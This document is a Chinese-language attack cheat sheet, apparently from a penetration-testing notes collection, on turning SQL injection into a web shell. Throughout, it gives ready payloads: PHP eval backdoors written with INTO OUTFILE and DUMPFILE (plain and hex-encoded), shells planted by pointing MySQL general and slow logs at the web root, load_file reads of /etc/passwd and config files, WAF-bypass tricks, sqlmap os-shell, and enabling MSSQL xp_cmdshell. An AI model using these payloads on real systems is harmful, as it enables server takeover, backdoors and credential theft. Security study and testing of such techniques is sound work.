# 04-SQL注入

## 总览

> **通路**: ② 写文件\
> **来源**: `SQL.md` L2175-L2245 + 网络补充

***

## 一、前置三条件

写 shell 必须**同时**满足：

1. **数据库有文件写权限**（`FILE` 权限）
2. `secure_file_priv`\*\* 为空或指定目录\*\*（MySQL 5.7+ 默认非空）
3. **知道 web 绝对路径**（可通过报错、phpinfo、日志泄露）

检查:

```sql
show variables like '%secure%';
select @@secure_file_priv;
```

***

## 二、into outfile（最常用）

```sql
select '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/xx.php';
```

**注意**: outfile 后面不能接 `0x` 开头或 char 转换的路径，只能是**单引号路径**。\
PHP 注入中会自动转义单引号，此时用 hex 数据：

```sql
select 0x3C3F706870206576616C28245F504F53545B636D645D3F3E into outfile '/var/www/html/xx.php';
# 0x3C3F706870... 解码后为 <?php eval($_POST[cmd]);?>
```

出处: `SQL.md` L2177-L2194

***

## 三、into dumpfile

```sql
select '<?php eval($_POST[cmd]);?>' into dumpfile '/var/www/html/xx.php';
select 0x3C3F706870... into dumpfile '/var/www/html/xx.php';
```

### outfile vs dumpfile

|  | into outfile | into dumpfile |
| --- | --- | --- |
| 导出行数 | 多行 | **仅一行** |
| 格式转换 | 有特殊转换 | **保持原格式** |
| 适用 | 文本文件 | **二进制文件** |
| 出处: `SQL.md` L2196-L2215 |  |  |

***

## 四、日志写 Shell ★（无需写权限配置，最稳）

```sql
-- 通用日志
show global variables like "%general%";                 -- 查看配置
set global general_log='on';                            -- 开启日志
set global general_log_file='/var/www/html/shell.php';  -- 指向 web 目录
select '<?php @eval($_POST[shell]); ?>';                -- 日志写入
set global general_log='off';                           -- 关闭

-- 慢查询日志
show variables like '%slow%';
set GLOBAL slow_query_log_file='/var/www/html/slow.php';
set GLOBAL slow_query_log=on;
select '<?php phpinfo();?>' from mysql.user where sleep(10);
```

出处: `SQL.md` L2217-L2243

MySQL 日志类型：`log_error` / `general_log` / `binary log` / `slow_query_log` / `innodb redo`

***

## 五、MySQL 任意文件读取

配合 `load_file()`:

```sql
select load_file('/etc/passwd');
select load_file('/var/www/html/config.php');
```

参考《MySQL 客户端任意文件读取》（`SQL.md` L2245）

***

## 六、phpMyAdmin GetShell（网络补充）

| 姿势 | 说明 |
| --- | --- |
| SQL 查询框 | 直接 `SELECT ... INTO OUTFILE` 写马 |
| `general_log` | `SET GLOBAL general_log_file` 写马 |
| `CREATE FUNCTION` | 导入 UDF 提权 |
| 数据库导出 | 导出点为 web 目录 |
| 版本漏洞 | phpMyAdmin 历史 RCE（如 CVE-2016-5734） |

***

## 七、SQL 注入配合 getshell 的完整链

```plain
1. sqlmap --os-shell / --file-write（自动化）
2. 手工: 找注入点 → 判断权限 → 找绝对路径 → into outfile / 日志写马
3. WAF 绕过: 
   - 关键字: 双写/大小写/内联注释 /*!50000union*/
   - 空格: /**/  %09  %0a  %a0  括号
   - 等号: like  regexp  between  in
   - 逗号: join  offset  limit
```

出处: `PAYLOAD-CHEATSHEET.md` L100-L118

***

## 八、MSSQL / Oracle 写 Shell

```sql
-- MSSQL: xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC master.dbo.xp_cmdshell 'whoami';
-- 或 OLE 自动化 / CLR

-- Oracle: Java 存储过程 / DBMS_SCHEDULER 执行系统命令
```

出处: `春秋云镜Brute4Road.meta.md`（MSSQL xpcmdshell）
